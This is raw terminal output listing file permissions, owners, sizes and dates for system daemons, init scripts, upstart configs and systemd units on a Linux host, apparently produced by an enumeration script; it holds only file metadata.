-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron                    
-rwxr-xr-x 1 root root    48440 Apr 11  2016 /usr/sbin/irqbalance              
-rwxr-xr-x 1 root root 24754056 Apr 27  2017 /usr/sbin/mysqld                  
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd                
-rwxr-xr-x 1 root root   799216 Mar 16  2017 /usr/sbin/sshd                    


[-] /etc/init.d/ binary permissions:   
total 356                              
drwxr-xr-x   2 root root 4096 May 22  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root 1286 May 22  2017 .depend.boot                        
-rw-r--r--   1 root root 1291 May 22  2017 .depend.start                       
-rw-r--r--   1 root root 1286 May 22  2017 .depend.stop                        
-rw-r--r--   1 root root 2427 Jan 19  2016 README                              
-rwxr-xr-x   1 root root 2243 Feb  9  2016 acpid                               
-rwxr-xr-x   1 root root 5336 Apr 15  2016 alsa-utils                          
-rwxr-xr-x   1 root root 2014 Dec 28  2014 anacron                             
-rwxr-xr-x   1 root root 6223 Mar  3  2017 apparmor                            
-rwxr-xr-x   1 root root 2799 Mar 31  2016 apport                              
-rwxr-xr-x   1 root root 1071 Dec  6  2015 atd                                 
-rwxr-xr-x   1 root root 2968 Mar  1  2016 bluetooth                           
-rwxr-xr-x   1 root root 1275 Jan 19  2016 bootmisc.sh                         
-rwxr-xr-x   1 root root 3807 Jan 19  2016 checkfs.sh                          
-rwxr-xr-x   1 root root 1098 Jan 19  2016 checkroot-bootclean.sh              
-rwxr-xr-x   1 root root 9353 Jan 19  2016 checkroot.sh                        
-rwxr-xr-x   1 root root 1343 Apr  4  2016 console-setup                       
-rwxr-xr-x   1 root root 3049 Apr  5  2016 cron                                
-rwxr-xr-x   1 root root  937 Mar 28  2015 cryptdisks                          
-rwxr-xr-x   1 root root  896 Mar 28  2015 cryptdisks-early                    
-rwxr-xr-x   1 root root 2813 Dec  2  2015 dbus                                
-rwxr-xr-x   1 root root 1105 Mar 15  2016 grub-common                         
-rwxr-xr-x   1 root root 1336 Jan 19  2016 halt                                
-rwxr-xr-x   1 root root 1423 Jan 19  2016 hostname.sh                         
-rwxr-xr-x   1 root root 3809 Mar 12  2016 hwclock.sh                          
-rwxr-xr-x   1 root root 2372 Apr 11  2016 irqbalance                          
-rwxr-xr-x   1 root root 1503 Mar 29  2016 iscsid                              
-rwxr-xr-x   1 root root 1804 Apr  4  2016 keyboard-setup                      
-rwxr-xr-x   1 root root 1300 Jan 19  2016 killprocs                           
-rwxr-xr-x   1 root root 2087 Dec 21  2015 kmod                                
-rwxr-xr-x   1 root root 3431 Mar 31  2017 lightdm                             
-rwxr-xr-x   1 root root  695 Oct 30  2015 lvm2                                
-rwxr-xr-x   1 root root  571 Oct 30  2015 lvm2-lvmetad                        
-rwxr-xr-x   1 root root  586 Oct 30  2015 lvm2-lvmpolld                       
-rwxr-xr-x   1 root root 2300 Feb  3  2017 lxcfs                               
-rwxr-xr-x   1 root root 2541 Feb  3  2017 lxd                                 
-rwxr-xr-x   1 root root 2611 Apr 11  2016 mdadm                               
-rwxr-xr-x   1 root root 1199 Jul 16  2014 mdadm-waitidle                      
-rwxr-xr-x   1 root root  703 Jan 19  2016 mountall-bootclean.sh               
-rwxr-xr-x   1 root root 2301 Jan 19  2016 mountall.sh                         
-rwxr-xr-x   1 root root 1461 Jan 19  2016 mountdevsubfs.sh                    
-rwxr-xr-x   1 root root 1564 Jan 19  2016 mountkernfs.sh                      
-rwxr-xr-x   1 root root  711 Jan 19  2016 mountnfs-bootclean.sh               
-rwxr-xr-x   1 root root 2456 Jan 19  2016 mountnfs.sh                         
-rwxr-xr-x   1 root root 5607 Feb  3  2017 mysql                               
-rwxr-xr-x   1 root root 1757 Jan 11  2017 network-manager                     
-rwxr-xr-x   1 root root 4771 Jul 19  2015 networking                          
-rwxr-xr-x   1 root root 4579 Apr 26  2016 nginx                               
-rwxr-xr-x   1 root root 1581 Oct 16  2015 ondemand                            
-rwxr-xr-x   1 root root 2503 Mar 29  2016 open-iscsi                          
-rwxr-xr-x   1 root root 1578 Sep 18  2016 open-vm-tools                       
-rwxr-xr-x   1 root root 4987 Mar  2  2017 php7.0-fpm                          
-rwxr-xr-x   1 root root 1366 Nov 15  2015 plymouth                            
-rwxr-xr-x   1 root root  752 Nov 15  2015 plymouth-log                        
-rwxr-xr-x   1 root root 1192 Sep  6  2015 procps                              
-rwxr-xr-x   1 root root 6366 Jan 19  2016 rc                                  
-rwxr-xr-x   1 root root  820 Jan 19  2016 rc.local                            
-rwxr-xr-x   1 root root  117 Jan 19  2016 rcS                                 
-rwxr-xr-x   1 root root  661 Jan 19  2016 reboot                              
-rwxr-xr-x   1 root root 4149 Nov 23  2015 resolvconf                          
-rwxr-xr-x   1 root root 4355 Jul 10  2014 rsync                               
-rwxr-xr-x   1 root root 2796 Feb  3  2016 rsyslog                             
-rwxr-xr-x   1 root root 1226 Jun  9  2015 screen-cleanup                      
-rwxr-xr-x   1 root root 3927 Jan 19  2016 sendsigs                            
-rwxr-xr-x   1 root root  597 Jan 19  2016 single                              
-rw-r--r--   1 root root 1087 Jan 19  2016 skeleton                            
-rwxr-xr-x   1 root root 4077 Mar 16  2017 ssh                                 
-rwxr-xr-x   1 root root 6087 Apr 12  2016 udev                                
-rwxr-xr-x   1 root root 2049 Aug  7  2014 ufw                                 
-rwxr-xr-x   1 root root 2737 Jan 19  2016 umountfs                            
-rwxr-xr-x   1 root root 2202 Jan 19  2016 umountnfs.sh                        
-rwxr-xr-x   1 root root 1879 Jan 19  2016 umountroot                          
-rwxr-xr-x   1 root root 1391 Apr 20  2017 unattended-upgrades                 
-rwxr-xr-x   1 root root 3111 Jan 19  2016 urandom                             
-rwxr-xr-x   1 root root 1306 Dec 16  2016 uuidd                               
-rwxr-xr-x   1 root root 2757 Nov 10  2015 x11-common                          


[-] /etc/init/ config file permissions:                                        
total 360                              
drwxr-xr-x   2 root root 4096 May 22  2017 .                                   
drwxr-xr-x 109 root root 4096 May 22  2017 ..                                  
-rw-r--r--   1 root root  338 Apr  9  2016 acpid.conf                          
-rw-r--r--   1 root root  309 Apr 15  2016 alsa-utils.conf                     
-rw-r--r--   1 root root  278 Dec 28  2014 anacron.conf                        
-rw-r--r--   1 root root 3709 Mar  3  2017 apparmor.conf                       
-rw-r--r--   1 root root 1626 Jan 10  2017 apport.conf                         
-rw-r--r--   1 root root  997 Mar  1  2016 bluetooth.conf                      
-rw-r--r--   1 root root  328 Nov 18  2014 bootmisc.sh.conf                    
-rw-r--r--   1 root root  232 Nov 18  2014 checkfs.sh.conf                     
-rw-r--r--   1 root root  253 Nov 18  2014 checkroot-bootclean.sh.conf         
-rw-r--r--   1 root root  307 Nov 18  2014 checkroot.sh.conf                   
-rw-r--r--   1 root root  250 Apr  4  2016 console-font.conf                   
-rw-r--r--   1 root root  509 Apr  4  2016 console-setup.conf                  
-rw-r--r--   1 root root  266 May 19  2016 console.conf                        
-rw-r--r--   1 root root 1122 May 19  2016 container-detect.conf               
-rw-r--r--   1 root root  356 May 19  2016 control-alt-delete.conf             
-rw-r--r--   1 root root  297 Apr  5  2016 cron.conf                           
-rw-r--r--   1 root root  412 Mar 28  2015 cryptdisks-udev.conf                
-rw-r--r--   1 root root 1519 Mar 28  2015 cryptdisks.conf                     
-rw-r--r--   1 root root  482 Sep  1  2015 dbus.conf                           
-rw-r--r--   1 root root  374 Aug 20  2016 failsafe-x.conf                     
-rw-r--r--   1 root root 1377 May 19  2016 failsafe.conf                       
-rw-r--r--   1 root root  267 May 19  2016 flush-early-job-log.conf            
-rw-r--r--   1 root root 1247 Jun  1  2015 friendly-recovery.conf              
-rw-r--r--   1 root root  186 Aug 25  2016 gpu-manager.conf                    
-rw-r--r--   1 root root  284 Jul 23  2013 hostname.conf                       
-rw-r--r--   1 root root  300 May 21  2014 hostname.sh.conf                    
-rw-r--r--   1 root root  561 Mar 14  2016 hwclock-save.conf                   
-rw-r--r--   1 root root  674 Mar 14  2016 hwclock.conf                        
-rw-r--r--   1 root root  109 Mar 14  2016 hwclock.sh.conf                     
-rw-r--r--   1 root root  597 Apr 11  2016 irqbalance.conf                     
-rw-r--r--   1 root root  689 Aug 20  2015 kmod.conf                           
-rw-r--r--   1 root root 1444 Mar 31  2017 lightdm.conf                        
-rw-r--r--   1 root root  540 Feb  3  2017 lxcfs.conf                          
-rw-r--r--   1 root root  813 Feb  3  2017 lxd.conf                            
-rw-r--r--   1 root root  268 Nov 18  2014 mountall-bootclean.sh.conf          
-rw-r--r--   1 root root  349 Nov 18  2014 mountall-net.conf                   
-rw-r--r--   1 root root  261 Nov 18  2014 mountall-reboot.conf                
-rw-r--r--   1 root root 1201 Nov 18  2014 mountall-shell.conf                 
-rw-r--r--   1 root root 1232 Nov 18  2014 mountall.conf                       
-rw-r--r--   1 root root  311 Nov 18  2014 mountall.sh.conf                    
-rw-r--r--   1 root root  327 Nov 18  2014 mountdevsubfs.sh.conf               
-rw-r--r--   1 root root  405 Nov 18  2014 mounted-debugfs.conf                
-rw-r--r--   1 root root  730 Nov 18  2014 mounted-dev.conf                    
-rw-r--r--   1 root root  536 Nov 18  2014 mounted-proc.conf                   
-rw-r--r--   1 root root  618 Nov 18  2014 mounted-run.conf                    
-rw-r--r--   1 root root 1890 Nov 18  2014 mounted-tmp.conf                    
-rw-r--r--   1 root root  903 Nov 18  2014 mounted-var.conf                    
-rw-r--r--   1 root root  323 Nov 18  2014 mountkernfs.sh.conf                 
-rw-r--r--   1 root root  249 Nov 18  2014 mountnfs-bootclean.sh.conf          
-rw-r--r--   1 root root  313 Nov 18  2014 mountnfs.sh.conf                    
-rw-r--r--   1 root root  238 Nov 18  2014 mtab.sh.conf                        
-rw-r--r--   1 root root 1757 Feb  3  2017 mysql.conf                          
-rw-r--r--   1 root root  530 Jun  2  2015 network-interface-container.conf    
-rw-r--r--   1 root root 1756 Jun  2  2015 network-interface-security.conf     
-rw-r--r--   1 root root  933 Jun  2  2015 network-interface.conf              
-rw-r--r--   1 root root  568 Jan 11  2017 network-manager.conf                
-rw-r--r--   1 root root 2493 Jun  2  2015 networking.conf                     
-rw-r--r--   1 root root  401 Apr 26  2016 nginx.conf                          
-rw-r--r--   1 root root  568 Feb  1  2016 passwd.conf                         
-rw-r--r--   1 root root  398 Mar  2  2017 php7.0-fpm.conf                     
-rw-r--r--   1 root root  363 Jun  5  2014 procps-instance.conf                
-rw-r--r--   1 root root  119 Jun  5  2014 procps.conf                         
-rw-r--r--   1 root root 1543 May 19  2016 rc-sysinit.conf                     
-rw-r--r--   1 root root  661 May 19  2016 rc.conf                             
-rw-r--r--   1 root root  683 May 19  2016 rcS.conf                            
-rw-r--r--   1 root root  457 Jun  3  2015 resolvconf.conf                     
-rw-r--r--   1 root root  365 Nov  3  2014 rfkill-restore.conf                 
-rw-r--r--   1 root root  357 Nov  3  2014 rfkill-store.conf                   
-rw-r--r--   1 root root  426 Dec  2  2015 rsyslog.conf                        
-rw-r--r--   1 root root  230 Apr  4  2016 setvtrgb.conf                       
-rw-r--r--   1 root root  277 May 19  2016 shutdown.conf                       
-rw-r--r--   1 root root  641 Mar 16  2017 ssh.conf                            
-rw-r--r--   1 root root  348 May 19  2016 tty1.conf                           
-rw-r--r--   1 root root  333 May 19  2016 tty2.conf                           
-rw-r--r--   1 root root  333 May 19  2016 tty3.conf                           
-rw-r--r--   1 root root  333 May 19  2016 tty4.conf                           
-rw-r--r--   1 root root  232 May 19  2016 tty5.conf                           
-rw-r--r--   1 root root  232 May 19  2016 tty6.conf                           
-rw-r--r--   1 root root  337 Apr 12  2016 udev.conf                           
-rw-r--r--   1 root root  360 Apr 12  2016 udevmonitor.conf                    
-rw-r--r--   1 root root  352 Apr 12  2016 udevtrigger.conf                    
-rw-r--r--   1 root root  473 Aug  7  2014 ufw.conf                            
-rw-r--r--   1 root root  412 May 19  2016 upstart-file-bridge.conf            
-rw-r--r--   1 root root  329 May 19  2016 upstart-socket-bridge.conf          
-rw-r--r--   1 root root  553 May 19  2016 upstart-udev-bridge.conf            
-rw-r--r--   1 root root  683 Feb 24  2015 ureadahead-other.conf               
-rw-r--r--   1 root root  889 Feb 24  2015 ureadahead.conf                     
-rw-r--r--   1 root root 1521 May 19  2016 wait-for-state.conf                 


[-] /lib/systemd/* config file permissions:                                    
/lib/systemd/:                         
total 8.3M                             
drwxr-xr-x 25 root root  36K May 22  2017 system                               
drwxr-xr-x  2 root root 4.0K May 16  2017 system-sleep                         
drwxr-xr-x  2 root root 4.0K May 16  2017 network                              
drwxr-xr-x  2 root root 4.0K May 16  2017 system-generators                    
drwxr-xr-x  2 root root 4.0K May 16  2017 system-preset                        
-rwxr-xr-x  1 root root 443K Feb 15  2017 systemd-udevd                        
-rwxr-xr-x  1 root root 301K Feb 15  2017 systemd-fsck                         
-rwxr-xr-x  1 root root 139K Feb 15  2017 systemd-timesyncd                    
-rwxr-xr-x  1 root root 319K Feb 15  2017 systemd-journald                     
-rwxr-xr-x  1 root root 824K Feb 15  2017 systemd-networkd                     
-rwxr-xr-x  1 root root 657K Feb 15  2017 systemd-resolved                     
-rwxr-xr-x  1 root root 1.6M Feb 15  2017 systemd                              
-rwxr-xr-x  1 root root  75K Feb 15  2017 systemd-fsckd                        
-rwxr-xr-x  1 root root 332K Feb 15  2017 systemd-hostnamed                    
-rwxr-xr-x  1 root root 340K Feb 15  2017 systemd-localed                      
-rwxr-xr-x  1 root root  31K Feb 15  2017 systemd-reply-password               
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-socket-proxyd                
-rwxr-xr-x  1 root root  35K Feb 15  2017 systemd-user-sessions                
-rwxr-xr-x  1 root root  15K Feb 15  2017 systemd-ac-power                     
-rwxr-xr-x  1 root root  55K Feb 15  2017 systemd-activate                     
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-backlight                    
-rwxr-xr-x  1 root root  47K Feb 15  2017 systemd-binfmt                       
-rwxr-xr-x  1 root root 103K Feb 15  2017 systemd-bootchart                    
-rwxr-xr-x  1 root root  31K Feb 15  2017 systemd-hibernate-resume             
-rwxr-xr-x  1 root root 276K Feb 15  2017 systemd-initctl                      
-rwxr-xr-x  1 root root 123K Feb 15  2017 systemd-networkd-wait-online         
-rwxr-xr-x  1 root root  35K Feb 15  2017 systemd-random-seed                  
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-rfkill                       
-rwxr-xr-x  1 root root  51K Feb 15  2017 systemd-sysctl                       
-rwxr-xr-x  1 root root 333K Feb 15  2017 systemd-timedated                    
-rwxr-xr-x  1 root root 268K Feb 15  2017 systemd-cgroups-agent                
-rwxr-xr-x  1 root root  91K Feb 15  2017 systemd-cryptsetup                   
-rwxr-xr-x  1 root root 605K Feb 15  2017 systemd-logind                       
-rwxr-xr-x  1 root root  35K Feb 15  2017 systemd-quotacheck                   
-rwxr-xr-x  1 root root  51K Feb 15  2017 systemd-remount-fs                   
-rwxr-xr-x  1 root root  71K Feb 15  2017 systemd-sleep                        
-rwxr-xr-x  1 root root 276K Feb 15  2017 systemd-update-utmp                  
-rwxr-xr-x  1 root root 352K Feb 15  2017 systemd-bus-proxyd                   
-rwxr-xr-x  1 root root  51K Feb 15  2017 systemd-modules-load                 
-rwxr-xr-x  1 root root 143K Feb 15  2017 systemd-shutdown                     
-rwxr-xr-x  1 root root 1.3K Feb  2  2017 systemd-sysv-install                 
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown                      

/lib/systemd/system:                   
total 916K                             
drwxr-xr-x 2 root root 4.0K May 16  2017 sockets.target.wants                  
drwxr-xr-x 2 root root 4.0K May 16  2017 sysinit.target.wants                  
drwxr-xr-x 2 root root 4.0K May 16  2017 getty.target.wants                    
drwxr-xr-x 2 root root 4.0K May 16  2017 graphical.target.wants                
drwxr-xr-x 2 root root 4.0K May 16  2017 local-fs.target.wants                 
drwxr-xr-x 2 root root 4.0K May 16  2017 multi-user.target.wants               
drwxr-xr-x 2 root root 4.0K May 16  2017 poweroff.target.wants                 
drwxr-xr-x 2 root root 4.0K May 16  2017 rc-local.service.d                    
drwxr-xr-x 2 root root 4.0K May 16  2017 reboot.target.wants                   
drwxr-xr-x 2 root root 4.0K May 16  2017 rescue.target.wants                   
drwxr-xr-x 2 root root 4.0K May 16  2017 resolvconf.service.wants              
drwxr-xr-x 2 root root 4.0K May 16  2017 sigpwr.target.wants                   
drwxr-xr-x 2 root root 4.0K May 16  2017 systemd-timesyncd.service.d           
drwxr-xr-x 2 root root 4.0K May 16  2017 timers.target.wants                   
lrwxrwxrwx 1 root root    9 May 15  2017 screen-cleanup.service -> /dev/null   
drwxr-xr-x 2 root root 4.0K May 15  2017 halt.target.wants                     
drwxr-xr-x 2 root root 4.0K May 15  2017 initrd-switch-root.target.wants       
drwxr-xr-x 2 root root 4.0K May 15  2017 kexec.target.wants                    
-rw-r--r-- 1 root root  192 Apr 29  2017 snapd.autoimport.service              
-rw-r--r-- 1 root root  290 Apr 29  2017 snapd.refresh.service                 
-rw-r--r-- 1 root root  323 Apr 29  2017 snapd.refresh.timer                   
-rw-r--r-- 1 root root  184 Apr 29  2017 snapd.service                         
-rw-r--r-- 1 root root  281 Apr 29  2017 snapd.socket                          
-rw-r--r-- 1 root root  474 Apr 29  2017 snapd.system-shutdown.service         
-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service           
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service                           
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket                            
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service                          
-rw-r--r-- 1 root root  386 Mar  2  2017 php7.0-fpm.service                    
-rw-r--r-- 1 root root  153 Feb 27  2017 apt-daily.service                     
-rw-r--r-- 1 root root  162 Feb 27  2017 apt-daily.timer                       
drwxr-xr-x 2 root root 4.0K Feb 15  2017 busnames.target.wants                 
lrwxrwxrwx 1 root root   21 Feb 15  2017 udev.service -> systemd-udevd.service 
lrwxrwxrwx 1 root root    9 Feb 15  2017 bootlogd.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 bootmisc.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 checkfs.service -> /dev/null          
lrwxrwxrwx 1 root root    9 Feb 15  2017 fuse.service -> /dev/null             
lrwxrwxrwx 1 root root    9 Feb 15  2017 hostname.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 hwclock.service -> /dev/null          
lrwxrwxrwx 1 root root   28 Feb 15  2017 kmod.service -> systemd-modules-load.service                                                                          
lrwxrwxrwx 1 root root   28 Feb 15  2017 module-init-tools.service -> systemd-modules-load.service                                                             
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountall-bootclean.service -> /dev/null                                                                               
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountall.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountdevsubfs.service -> /dev/null    
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountkernfs.service -> /dev/null      
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountnfs-bootclean.service -> /dev/null                                                                               
lrwxrwxrwx 1 root root    9 Feb 15  2017 mountnfs.service -> /dev/null         
lrwxrwxrwx 1 root root   22 Feb 15  2017 procps.service -> systemd-sysctl.service                                                                              
lrwxrwxrwx 1 root root   16 Feb 15  2017 rc.local.service -> rc-local.service  
lrwxrwxrwx 1 root root    9 Feb 15  2017 rmnologin.service -> /dev/null        
lrwxrwxrwx 1 root root    9 Feb 15  2017 stop-bootlogd-single.service -> /dev/null                                                                             
lrwxrwxrwx 1 root root    9 Feb 15  2017 stop-bootlogd.service -> /dev/null    
lrwxrwxrwx 1 root root    9 Feb 15  2017 umountfs.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 umountnfs.service -> /dev/null        
lrwxrwxrwx 1 root root    9 Feb 15  2017 umountroot.service -> /dev/null       
lrwxrwxrwx 1 root root   27 Feb 15  2017 urandom.service -> systemd-random-seed.service                                                                        
lrwxrwxrwx 1 root root    9 Feb 15  2017 x11-common.service -> /dev/null       
lrwxrwxrwx 1 root root   14 Feb 15  2017 autovt@.service -> getty@.service     
lrwxrwxrwx 1 root root    9 Feb 15  2017 bootlogs.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 checkroot-bootclean.service -> /dev/null                                                                              
lrwxrwxrwx 1 root root    9 Feb 15  2017 checkroot.service -> /dev/null        
lrwxrwxrwx 1 root root    9 Feb 15  2017 cryptdisks-early.service -> /dev/null 
lrwxrwxrwx 1 root root    9 Feb 15  2017 cryptdisks.service -> /dev/null       
lrwxrwxrwx 1 root root   13 Feb 15  2017 ctrl-alt-del.target -> reboot.target  
lrwxrwxrwx 1 root root   25 Feb 15  2017 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service                                                   
lrwxrwxrwx 1 root root   23 Feb 15  2017 dbus-org.freedesktop.locale1.service -> systemd-localed.service                                                       
lrwxrwxrwx 1 root root   22 Feb 15  2017 dbus-org.freedesktop.login1.service -> systemd-logind.service                                                         
lrwxrwxrwx 1 root root   24 Feb 15  2017 dbus-org.freedesktop.network1.service -> systemd-networkd.service                                                     
lrwxrwxrwx 1 root root   24 Feb 15  2017 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service                                                     
lrwxrwxrwx 1 root root   25 Feb 15  2017 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service                                                   
lrwxrwxrwx 1 root root   16 Feb 15  2017 default.target -> graphical.target    
lrwxrwxrwx 1 root root    9 Feb 15  2017 halt.service -> /dev/null             
lrwxrwxrwx 1 root root    9 Feb 15  2017 killprocs.service -> /dev/null        
lrwxrwxrwx 1 root root    9 Feb 15  2017 motd.service -> /dev/null             
lrwxrwxrwx 1 root root    9 Feb 15  2017 rc.service -> /dev/null               
lrwxrwxrwx 1 root root    9 Feb 15  2017 rcS.service -> /dev/null              
lrwxrwxrwx 1 root root    9 Feb 15  2017 reboot.service -> /dev/null           
lrwxrwxrwx 1 root root   15 Feb 15  2017 runlevel0.target -> poweroff.target   
lrwxrwxrwx 1 root root   13 Feb 15  2017 runlevel1.target -> rescue.target     
lrwxrwxrwx 1 root root   17 Feb 15  2017 runlevel2.target -> multi-user.target 
lrwxrwxrwx 1 root root   17 Feb 15  2017 runlevel3.target -> multi-user.target 
lrwxrwxrwx 1 root root   17 Feb 15  2017 runlevel4.target -> multi-user.target 
lrwxrwxrwx 1 root root   16 Feb 15  2017 runlevel5.target -> graphical.target  
lrwxrwxrwx 1 root root   13 Feb 15  2017 runlevel6.target -> reboot.target     
lrwxrwxrwx 1 root root    9 Feb 15  2017 sendsigs.service -> /dev/null         
lrwxrwxrwx 1 root root    9 Feb 15  2017 single.service -> /dev/null           
-rw-r--r-- 1 root root 1010 Feb 15  2017 debug-shell.service                   
-rw-r--r-- 1 root root 1009 Feb 15  2017 emergency.service                     
-rw-r--r-- 1 root root  630 Feb 15  2017 initrd-cleanup.service                
-rw-r--r-- 1 root root  790 Feb 15  2017 initrd-parse-etc.service              
-rw-r--r-- 1 root root  640 Feb 15  2017 initrd-switch-root.service            
-rw-r--r-- 1 root root  664 Feb 15  2017 initrd-udevadm-cleanup-db.service     
-rw-r--r-- 1 root root  677 Feb 15  2017 kmod-static-nodes.service             
-rw-r--r-- 1 root root  473 Feb 15  2017 mail-transport-agent.target           
-rw-r--r-- 1 root root  568 Feb 15  2017 quotaon.service                       
-rw-r--r-- 1 root root  612 Feb 15  2017 rc-local.service                      
-rw-r--r-- 1 root root  978 Feb 15  2017 rescue.service                        
-rw-r--r-- 1 root root  724 Feb 15  2017 systemd-backlight@.service            
-rw-r--r-- 1 root root  959 Feb 15  2017 systemd-binfmt.service                
-rw-r--r-- 1 root root  650 Feb 15  2017 systemd-bootchart.service             
-rw-r--r-- 1 root root 1.0K Feb 15  2017 systemd-bus-proxyd.service            
-rw-r--r-- 1 root root  497 Feb 15  2017 systemd-exit.service                  
-rw-r--r-- 1 root root  674 Feb 15  2017 systemd-fsck-root.service             
-rw-r--r-- 1 root root  648 Feb 15  2017 systemd-fsck@.service                 
-rw-r--r-- 1 root root  551 Feb 15  2017 systemd-fsckd.service                 
-rw-r--r-- 1 root root  544 Feb 15  2017 systemd-halt.service                  
-rw-r--r-- 1 root root  631 Feb 15  2017 systemd-hibernate-resume@.service     
-rw-r--r-- 1 root root  501 Feb 15  2017 systemd-hibernate.service             
-rw-r--r-- 1 root root  710 Feb 15  2017 systemd-hostnamed.service             
-rw-r--r-- 1 root root  778 Feb 15  2017 systemd-hwdb-update.service           
-rw-r--r-- 1 root root  519 Feb 15  2017 systemd-hybrid-sleep.service          
-rw-r--r-- 1 root root  731 Feb 15  2017 systemd-journal-flush.service         
-rw-r--r-- 1 root root 1.3K Feb 15  2017 systemd-journald.service              
-rw-r--r-- 1 root root  557 Feb 15  2017 systemd-kexec.service                 
-rw-r--r-- 1 root root  691 Feb 15  2017 systemd-localed.service               
-rw-r--r-- 1 root root 1.2K Feb 15  2017 systemd-logind.service                
-rw-r--r-- 1 root root  693 Feb 15  2017 systemd-machine-id-commit.service     
-rw-r--r-- 1 root root  967 Feb 15  2017 systemd-modules-load.service          
-rw-r--r-- 1 root root  685 Feb 15  2017 systemd-networkd-wait-online.service  
-rw-r--r-- 1 root root 1.3K Feb 15  2017 systemd-networkd.service              
-rw-r--r-- 1 root root  553 Feb 15  2017 systemd-poweroff.service              
-rw-r--r-- 1 root root  614 Feb 15  2017 systemd-quotacheck.service            
-rw-r--r-- 1 root root  717 Feb 15  2017 systemd-random-seed.service           
-rw-r--r-- 1 root root  548 Feb 15  2017 systemd-reboot.service                
-rw-r--r-- 1 root root  907 Feb 15  2017 systemd-resolved.service              
-rw-r--r-- 1 root root  696 Feb 15  2017 systemd-rfkill.service                
-rw-r--r-- 1 root root  497 Feb 15  2017 systemd-suspend.service               
-rw-r--r-- 1 root root  649 Feb 15  2017 systemd-sysctl.service                
-rw-r--r-- 1 root root  655 Feb 15  2017 systemd-timedated.service             
-rw-r--r-- 1 root root 1.1K Feb 15  2017 systemd-timesyncd.service             
-rw-r--r-- 1 root root  598 Feb 15  2017 systemd-tmpfiles-clean.service        
-rw-r--r-- 1 root root  703 Feb 15  2017 systemd-tmpfiles-setup-dev.service    
-rw-r--r-- 1 root root  683 Feb 15  2017 systemd-tmpfiles-setup.service        
-rw-r--r-- 1 root root  823 Feb 15  2017 systemd-udev-settle.service           
-rw-r--r-- 1 root root  743 Feb 15  2017 systemd-udev-trigger.service          
-rw-r--r-- 1 root root  825 Feb 15  2017 systemd-udevd.service                 
-rw-r--r-- 1 root root  757 Feb 15  2017 systemd-update-utmp-runlevel.service  
-rw-r--r-- 1 root root  754 Feb 15  2017 systemd-update-utmp.service           
-rw-r--r-- 1 root root  573 Feb 15  2017 systemd-user-sessions.service         
-rw-r--r-- 1 root root  528 Feb 15  2017 user@.service                         
-rw-r--r-- 1 root root  770 Feb 15  2017 console-getty.service                 
-rw-r--r-- 1 root root  742 Feb 15  2017 console-shell.service                 
-rw-r--r-- 1 root root  791 Feb 15  2017 container-getty@.service              
-rw-r--r-- 1 root root 1.5K Feb 15  2017 getty@.service                        
-rw-r--r-- 1 root root 1.1K Feb 15  2017 serial-getty@.service                 
-rw-r--r-- 1 root root  653 Feb 15  2017 systemd-ask-password-console.service  
-rw-r--r-- 1 root root  681 Feb 15  2017 systemd-ask-password-wall.service     
-rw-r--r-- 1 root root  480 Feb 15  2017 systemd-initctl.service               
-rw-r--r-- 1 root root  757 Feb 15  2017 systemd-remount-fs.service            
-rw-r--r-- 1 root root  403 Feb 15  2017 -.slice                               
-rw-r--r-- 1 root root  879 Feb 15  2017 basic.target                          
-rw-r--r-- 1 root root  379 Feb 15  2017 bluetooth.target                      
-rw-r--r-- 1 root root  358 Feb 15  2017 busnames.target                       
-rw-r--r-- 1 root root  394 Feb 15  2017 cryptsetup-pre.target                 
-rw-r--r-- 1 root root  366 Feb 15  2017 cryptsetup.target                     
-rw-r--r-- 1 root root  670 Feb 15  2017 dev-hugepages.mount                   
-rw-r--r-- 1 root root  624 Feb 15  2017 dev-mqueue.mount                      
-rw-r--r-- 1 root root  431 Feb 15  2017 emergency.target                      
-rw-r--r-- 1 root root  501 Feb 15  2017 exit.target                           
-rw-r--r-- 1 root root  440 Feb 15  2017 final.target                          
-rw-r--r-- 1 root root  460 Feb 15  2017 getty.target                          
-rw-r--r-- 1 root root  558 Feb 15  2017 graphical.target                      
-rw-r--r-- 1 root root  487 Feb 15  2017 halt.target                           
-rw-r--r-- 1 root root  447 Feb 15  2017 hibernate.target                      
-rw-r--r-- 1 root root  468 Feb 15  2017 hybrid-sleep.target                   
-rw-r--r-- 1 root root  553 Feb 15  2017 initrd-fs.target                      
-rw-r--r-- 1 root root  526 Feb 15  2017 initrd-root-fs.target                 
-rw-r--r-- 1 root root  691 Feb 15  2017 initrd-switch-root.target             
-rw-r--r-- 1 root root  671 Feb 15  2017 initrd.target                         
-rw-r--r-- 1 root root  501 Feb 15  2017 kexec.target                          
-rw-r--r-- 1 root root  395 Feb 15  2017 local-fs-pre.target                   
-rw-r--r-- 1 root root  507 Feb 15  2017 local-fs.target                       
-rw-r--r-- 1 root root  405 Feb 15  2017 machine.slice                         
-rw-r--r-- 1 root root  492 Feb 15  2017 multi-user.target                     
-rw-r--r-- 1 root root  464 Feb 15  2017 network-online.target                 
-rw-r--r-- 1 root root  461 Feb 15  2017 network-pre.target                    
-rw-r--r-- 1 root root  480 Feb 15  2017 network.target                        
-rw-r--r-- 1 root root  514 Feb 15  2017 nss-lookup.target                     
